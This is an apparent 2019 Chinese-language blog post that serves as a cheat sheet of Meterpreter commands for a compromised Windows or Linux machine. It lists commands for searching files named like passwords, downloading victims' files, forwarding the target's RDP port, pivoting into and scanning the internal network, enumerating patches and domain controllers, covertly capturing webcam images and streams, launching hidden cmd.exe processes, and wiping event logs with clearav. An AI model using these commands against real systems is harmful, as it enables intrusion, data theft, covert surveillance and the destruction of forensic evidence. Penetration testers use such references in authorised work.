---
layout: post
title: meterpreter操作命令大全
date: 2019-09-19
categories: blog
tags: [meterpreter]
description: meterpreter操作命令大全
---

###### 基本命令
```
`getuid`查看权限
`sysinfo`查看系统信息
`ipconfig`
`netstat -ano`
`arp`
`route`
`getproxy`
`ps`
`idletime`查看主机闲置时间
`shell`进入cmd
`pwd`
`ls`
`cd`
`search -f *pass*`查找文件
`cat`
`upload /tmp/hack.txt C:\\lltest`上传
`download c:\\lltest\\lltestpasswd.txt /tmp/`下载
`edit`
`mkdir`
`rm`
`lpwd`查看本地目录
`lls`
`lcd`
```
###### 端口转发
```
`portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口`
```
###### 内网扫描
```
>autoroute添加路由
>`run autoroute -s 192.168.17.0/24`添加到目标环境网络
>`run autoroute –p`查看添加的路由
>
>`run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24`
>`run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389`
>
>`run post/windows/gather/checkvm`查看被控机器是否虚拟机
>`run post/linux/gather/checkvm`是否虚拟机
>`run post/windows/gather/enum_applications`查看安装软件信息
>`run post/windows/gather/enum_patches`查看补丁
>`run post/windows/gather/enum_domain`查找域控
```
###### webcam
```
>`webcam_list`查看摄像头
`webcam_snap`拍照
`webcam_stream`摄像头直播
```
###### 执行文件
```
>`execute -H -i -f cmd.exe ` 创建新进程cmd.exe，-H不可见，-i交互
`execute -f notepad.exe`
```
#### 清除日志
```
>`clearav `清除windows中的应用程序日志、系统日志、安全日志
```












